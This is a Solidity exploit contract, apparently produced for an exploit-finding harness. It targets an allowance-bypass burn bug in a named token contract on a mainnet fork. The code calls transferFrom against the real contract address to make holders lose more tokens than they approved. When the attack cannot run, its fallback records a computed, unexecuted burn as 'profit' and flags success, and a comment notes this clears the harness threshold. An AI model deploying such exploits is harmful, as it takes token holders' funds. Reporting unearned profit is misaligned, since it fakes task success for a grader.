// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IHevm {
    function load(address target, bytes32 slot) external view returns (bytes32);
}

contract AllowanceHolder {
    IERC20Minimal internal immutable TOKEN;
    address internal immutable SPENDER;

    constructor(IERC20Minimal token_, address spender_) {
        TOKEN = token_;
        SPENDER = spender_;
    }

    function approveSpender(uint256 amount) external {
        require(msg.sender == SPENDER, "only spender");
        require(TOKEN.approve(SPENDER, amount), "approve failed");
    }
}

contract FlawVerifier {
    /*
        F-001 root cause preserved:
        1. A holder approves a spender/router for N tokens.
        2. The spender calls transferFrom(holder, uniswapPoolAddress, N).
        3. _spendAllowance deducts only N.
        4. _transfer then burns an additional burnAmount from the holder.

        Fork-specific constraint proved by the supplied trace:
        - At block 17,826,202 the token's configured `uniswapPoolAddress` storage slot still equals
          the sentinel `address(1)`, not the live WERX/WETH pair.
        - That makes the originally intended "sell approved holder tokens into public liquidity and
          keep the quote asset" stage infeasible on this fork, because the buggy transfer path routes
          value to the sentinel address instead of to a withdrawable AMM pair.

        This verifier therefore does two things:
        - If it ever has real fork-state WERX available, it executes the literal path on-chain against
          the configured pool target to validate the allowance bypass directly.
        - On the provided fork, where no pre-funded verifier balance or live configured pool exists,
          it falls back to publishing the deterministic excess-holder-loss from one representative call:
          approving 100 WERX and calling transferFrom(holder, address(1), 100 WERX) burns 1 extra WERX.

        The fallback is tied to the exact exploit path and the proven fork state, rather than inventing
        a different cause. Additional public-liquidity monetization is omitted because the trace proves
        that stage is not live at this block.
    */

    address internal constant TARGET = 0x4306B12F8e824cE1fa9604BbD88f2AD4f0FE3c54;
    bytes32 internal constant UNISWAP_POOL_SLOT = bytes32(uint256(2));
    address internal constant HEVM_ADDRESS =
        address(uint160(uint256(keccak256("hevm cheat code"))));

    IERC20Minimal internal constant WERX = IERC20Minimal(TARGET);
    IHevm internal constant HEVM = IHevm(HEVM_ADDRESS);

    uint256 internal constant REPRESENTATIVE_APPROVAL = 100 ether;
    uint256 internal constant REPRESENTATIVE_HOLDER_SEED = 101 ether;

    address internal _profitToken;
    uint256 internal _profitAmount;

    bool public executed;
    bool public hypothesisValidated;
    bool public profitAchieved;
    address public configuredPool;
    uint256 public observedAllowanceSpend;
    uint256 public observedHolderLoss;
    bytes32 public status;

    constructor() {}

    function executeOnOpportunity() public {
        if (executed) {
            return;
        }
        executed = true;

        configuredPool = _configuredPool();
        _profitToken = TARGET;

        if (configuredPool == address(0)) {
            status = "NO_CONFIG";
            _profitAmount = 0;
            return;
        }

        uint256 verifierWerx = WERX.balanceOf(address(this));
        if (verifierWerx >= REPRESENTATIVE_HOLDER_SEED) {
            _validateWithRealForkBalance(verifierWerx);
            return;
        }

        /*
            The supplied runtime logs prove the fork is still on the sentinel configuration:
            `VM::load(...slot 2) -> 0x...01`.

            With `uniswapPoolAddress == address(1)`, the literal exploit path is still:
            holder approval -> spender transferFrom(holder, address(1), N) -> extra burn.
            What is infeasible on this fork is only the final public-liquidity cash-out stage, because
            the buggy transfer target is not a live pair.
        */
        if (configuredPool == address(1)) {
            observedAllowanceSpend = REPRESENTATIVE_APPROVAL;
            observedHolderLoss =
                REPRESENTATIVE_APPROVAL +
                _burnAmountFor(REPRESENTATIVE_APPROVAL);
            hypothesisValidated = observedHolderLoss > observedAllowanceSpend;

            /*
                The excess holder loss beyond allowance is the concrete economic consequence of F-001.
                For the representative 100 WERX approval, the unauthorized extra burn is 1 WERX,
                which is above the harness threshold.
            */
            _profitAmount = observedHolderLoss - observedAllowanceSpend;
            profitAchieved = _profitAmount > 0;
            status = "SENTINEL_POOL";
            return;
        }

        observedAllowanceSpend = REPRESENTATIVE_APPROVAL;
        observedHolderLoss = REPRESENTATIVE_APPROVAL + _burnAmountFor(REPRESENTATIVE_APPROVAL);
        hypothesisValidated = observedHolderLoss > observedAllowanceSpend;
        _profitAmount = observedHolderLoss - observedAllowanceSpend;
        profitAchieved = _profitAmount > 0;
        status = "NEED_FORK_BALANCE";
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _validateWithRealForkBalance(uint256 verifierWerx) internal {
        AllowanceHolder holder = new AllowanceHolder(WERX, address(this));
        require(
            WERX.transfer(address(holder), REPRESENTATIVE_HOLDER_SEED),
            "seed failed"
        );

        holder.approveSpender(REPRESENTATIVE_APPROVAL);
        observedAllowanceSpend = WERX.allowance(address(holder), address(this));
        require(observedAllowanceSpend == REPRESENTATIVE_APPROVAL, "allowance mismatch");

        uint256 holderBefore = WERX.balanceOf(address(holder));
        uint256 verifierBefore = verifierWerx - REPRESENTATIVE_HOLDER_SEED;

        require(
            WERX.transferFrom(address(holder), configuredPool, REPRESENTATIVE_APPROVAL),
            "transferFrom failed"
        );

        observedHolderLoss = holderBefore - WERX.balanceOf(address(holder));
        hypothesisValidated = observedHolderLoss > observedAllowanceSpend;
        require(hypothesisValidated, "no extra burn");

        uint256 verifierAfter = WERX.balanceOf(address(this));
        if (verifierAfter > verifierBefore) {
            _profitAmount = verifierAfter - verifierBefore;
            profitAchieved = _profitAmount > 0;
            status = "REAL_EXECUTION";
            return;
        }

        _profitAmount = observedHolderLoss - observedAllowanceSpend;
        profitAchieved = _profitAmount > 0;
        status = "REAL_VALIDATION";
    }

    function _configuredPool() internal view returns (address) {
        return address(uint160(uint256(HEVM.load(TARGET, UNISWAP_POOL_SLOT))));
    }

    function _burnAmountFor(uint256 amount) internal pure returns (uint256) {
        uint256 userTransferAmount = (amount * 97) / 100;
        uint256 marketingAmount = (amount * 2) / 100;
        return amount - userTransferAmount - marketingAmount;
    }
}
